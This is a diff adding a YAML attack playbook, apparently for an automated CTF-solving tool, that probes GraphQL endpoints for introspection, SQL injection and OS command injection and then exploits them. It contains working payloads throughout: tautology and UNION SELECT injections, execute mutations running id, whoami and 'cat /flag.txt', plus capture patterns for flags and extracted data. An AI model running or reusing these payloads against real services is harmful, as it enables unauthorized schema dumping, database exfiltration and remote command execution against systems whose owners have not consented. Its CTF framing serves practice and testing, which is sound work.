@@ -1,0 +1,178 @@
+id: web_graphql_injection
+name: GraphQL Injection & Introspection
+category: web
+version: "1.1"
+author: system
+description: >
+  Detects GraphQL introspection vulnerabilities for schema exposure and injection flaws
+  (e.g., SQL, OS command) in GraphQL arguments.
+
+tags:
+  - graphql
+  - api
+  - introspection
+  - injection
+estimated_duration_seconds: 45
+
+applies_when:
+  - "context.challenge.type == 'web'"
+
+min_confidence: 0.10
+stop_on_flag: true
+
+confidence_seeds:
+  - if: "any(p in context.found_paths for p in ['/graphql', '/graphiql', '/altair', '/_graphql'])"
+    boost: 0.25
+    label: "GraphQL endpoint path found"
+  - if: "'graphql' in context.tech_stack"
+    boost: 0.20
+    label: "GraphQL framework detected in tech stack"
+  - if: "any(p in context.params for p in ['query', 'operationName', 'variables'])"
+    boost: 0.15
+    label: "GraphQL-related parameters found"
+
+detection_paths:
+  - id: graphql_introspection_probe
+    name: GraphQL Introspection Query Probe
+    description: >
+      Sends a standard GraphQL introspection query to check if schema introspection is enabled.
+    min_confidence: 0.10
+    steps:
+      - id: send_introspection_query
+        action: http_probe
+        params:
+          request_source: request_candidates
+          candidate_filter: "request.path.endswith('/graphql') or request.path.endswith('/graphiql') or request.path.endswith('/altair') or request.path == '/graphql'"
+          inject_into: all_params
+          payloads:
+            - 'query { __schema { queryType { name } types { name kind } } }'
+            - 'query IntrospectionQuery { __schema { types { name kind fields { name } } } }'
+        signals:
+          - match:
+              condition: "response.status in [200, 400] and re.search(r'__schema|__type', response.body, re.I) and not re.search(r'introspection.*disabled|not allowed|forbidden', response.body, re.I)"
+            on_match:
+              confidence_boost: 0.50
+              emit: graphql_introspection_enabled
+          - match:
+              condition: "response.status in [200, 400] and re.search(r'\"name\"\\s*:\\s*\"Query\"', response.body)"
+            on_match:
+              confidence_boost: 0.40
+              emit: graphql_introspection_enabled
+
+  - id: graphql_sql_injection_probe
+    name: GraphQL SQL Injection Probe
+    description: >
+      Injects common SQL injection payloads into a GraphQL argument to detect backend SQLi.
+    min_confidence: 0.20
+    steps:
+      - id: inject_sqli_payload
+        action: http_probe
+        params:
+          request_source: request_candidates
+          candidate_filter: "request.path.endswith('/graphql') or request.path.endswith('/graphiql') or request.path == '/graphql'"
+          inject_into: all_params
+          payloads:
+            - 'query { user(id: "1 OR 1=1") { username } }'
+            - 'query { user(id: "1'' OR ''1''=''1") { username } }'
+            - "query { search(term: \"\\\" UNION SELECT null --\") { id } }"
+        signals:
+          - match:
+              condition: "response.status in [200, 400, 500] and re.search(r'SQLSTATE|ORA-|Fatal error|SQLite|syntax error', response.body, re.I)"
+            on_match:
+              confidence_boost: 0.45
+              emit: graphql_sqli_detected
+          - match:
+              condition: "response.status in [200, 400] and re.search(r'\"username\"\\s*:\\s*\"admin\"', response.body, re.I)"
+            on_match:
+              confidence_boost: 0.40
+              emit: graphql_sqli_login_bypass
+
+  - id: graphql_os_command_injection_probe
+    name: GraphQL OS Command Injection Probe
+    description: >
+      Injects OS command payloads into a GraphQL argument, expecting execution.
+    min_confidence: 0.25
+    steps:
+      - id: inject_os_command_payload
+        action: http_probe
+        params:
+          request_source: request_candidates
+          candidate_filter: "request.path.endswith('/graphql') or request.path == '/graphql'"
+          inject_into: all_params
+          payloads:
+            - 'mutation { execute(cmd: "id") }'
+            - 'mutation { execute(cmd: "whoami") }'
+        signals:
+          - match:
+              condition: "response.status in [200, 500] and re.search(r'uid=|gid=|whoami', response.body, re.I)"
+            on_match:
+              confidence_boost: 0.50
+              emit: graphql_os_command_injection_detected
+
+exploitation_paths:
+  - id: dump_graphql_schema
+    name: Dump GraphQL Schema
+    requires_signal: graphql_introspection_enabled
+    technique: graphql_schema_dump
+    description: >
+      Introspection is enabled, allowing a full dump of the GraphQL schema. This often reveals hidden fields and mutations.
+    steps:
+      - id: get_full_schema
+        action: http_probe
+        params:
+          request_source: request_candidates
+          candidate_filter: "request.path.endswith('/graphql') or request.path == '/graphql'"
+          inject_into: all_params
+          payloads:
+            - 'query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name kind } } }'
+        capture:
+          - pattern: '(?s)__schema\s*\{.*'
+            as: graphql_schema_dump
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+
+  - id: exploit_graphql_sqli
+    name: Exploit GraphQL SQL Injection
+    requires_signal: graphql_sqli_detected
+    technique: graphql_sqli_exploitation
+    description: >
+      SQL Injection vulnerability detected in a GraphQL argument. Attempting to exfiltrate data or gain access.
+    steps:
+      - id: sqli_data_exfiltration
+        action: http_probe
+        params:
+          request_source: request_candidates
+          candidate_filter: "request.path.endswith('/graphql') or request.path == '/graphql'"
+          inject_into: all_params
+          payloads:
+            - 'query { user(id: "1 UNION SELECT database(), null") { username } }'
+        capture:
+          - pattern: '"username"\s*:\s*"([^"]+)"'
+            as: sql_exfiltrated_data
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+
+  - id: exploit_graphql_os_command_injection
+    name: Exploit GraphQL OS Command Injection
+    requires_signal: graphql_os_command_injection_detected
+    technique: graphql_os_command_injection_exploitation
+    description: >
+      OS Command Injection vulnerability detected in a GraphQL argument. Attempting RCE.
+    steps:
+      - id: rce_flag_capture
+        action: http_probe
+        params:
+          request_source: request_candidates
+          candidate_filter: "request.path.endswith('/graphql') or request.path == '/graphql'"
+          inject_into: all_params
+          payloads:
+            - 'mutation { execute(cmd: "cat /flag.txt") }'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
